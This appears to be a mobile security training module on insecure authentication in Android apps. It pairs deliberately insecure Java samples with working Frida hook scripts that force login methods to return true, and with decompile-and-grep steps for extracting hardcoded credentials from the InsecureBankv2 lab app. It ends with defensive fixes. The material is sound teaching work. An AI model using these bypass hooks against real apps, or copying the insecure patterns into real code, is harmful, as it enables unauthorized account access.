---
name: M4 - Insecure Authentication
description: Tutorial on identifying and exploiting insecure authentication vulnerabilities
---

# M4: Insecure Authentication

## Overview

Insecure authentication vulnerabilities occur when applications fail to properly verify the identity of users, allowing attackers to bypass login mechanisms or gain unauthorized access.

## Common Vulnerabilities

### 1. Hardcoded Credentials
```java
// INSECURE: Hardcoded username and password
private static final String USERNAME = "admin";
private static final String PASSWORD = "password123";

public boolean login(String user, String pass) {
    return USERNAME.equals(user) && PASSWORD.equals(pass);
}
```

### 2. Credential Exposure in Logs
```java
// INSECURE: Logging passwords
Log.d("LoginActivity", "Attempting login with: " + username + "/" + password);
```

### 3. Weak Password Policies
```java
// INSECURE: No password complexity requirements
public boolean isValidPassword(String password) {
    return password != null && password.length() >= 3;
}
```

## Detection Methods

### Using Frida for Dynamic Analysis

1. Hook the login method to bypass authentication:
```javascript
Java.perform(function() {
    const LoginActivity = Java.use('com.example.app.LoginActivity');
    
    LoginActivity.login.implementation = function(user, pass) {
        console.log("Login attempted: " + user + "/" + pass);
        return true; // Always succeed
    };
});
```

2. Save as `login-bypass.js` and run:
```bash
frida -U -f com.example.app -l login-bypass.js
```

## Hands-On Practice with InsecureBankv2

### Target App
**InsecureBankv2** - Vulnerable banking app with weak authentication.

### Exercise 1: Bypass Login Screen

1. Install and launch InsecureBankv2:
```bash
adb install InsecureBankv2.apk
```

2. Decompile the APK with JADX to find the login method:
```bash
jadx -d decompiled InsecureBankv2.apk
```

3. Find the login method in `MainLoginActivity`.

4. Create a Frida script to bypass login:
```javascript
Java.perform(function() {
    const MainLoginActivity = Java.use('com.android.insecurebankv2.MainLoginActivity');
    
    MainLoginActivity.login.implementation = function() {
        console.log("Login bypassed!");
        return true;
    };
});
```

5. Run the script:
```bash
frida -U -f com.android.insecurebankv2 -l login-bypass.js --no-pause
```

6. Launch the app and you should be logged in directly.

### Exercise 2: Extract Hardcoded Credentials

1. Search decompiled code for hardcoded passwords:
```bash
grep -r "password\|admin" decompiled/sources/
```

2. Look for interesting strings in `strings.xml`:
```bash
cat decompiled/resources/res/values/strings.xml
```

## Defense Strategies

### 1. Implement Proper Authentication
```java
// Secure: Use strong authentication with salted hashes
public boolean login(String username, String password) {
    User user = userRepository.findByUsername(username);
    if (user != null) {
        return BCrypt.checkpw(password, user.getPasswordHash());
    }
    return false;
}
```

### 2. Avoid Hardcoded Credentials
```xml
<!-- Use secure storage for sensitive information -->
<!-- Don't put secrets in strings.xml! -->
<string name="api_key">@string/secure_api_key</string>
```

### 3. Secure Logging
```java
// Secure: Don't log sensitive information
if (BuildConfig.DEBUG) {
    Log.d("LoginActivity", "Login attempted");
}
```

## Challenge

Using what you've learned:

1. **Target**: InsecureBankv2
2. **Task**: Extract all hardcoded credentials
3. **Hint**: Look for admin credentials in the decompiled code

## Tools Reference

- **Frida**: Dynamic instrumentation and hooking
- **JADX**: Static analysis and decompilation
- **ADB**: Android Debug Bridge

## Additional Resources

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Android Keystore System](https://developer.android.com/training/articles/keystore)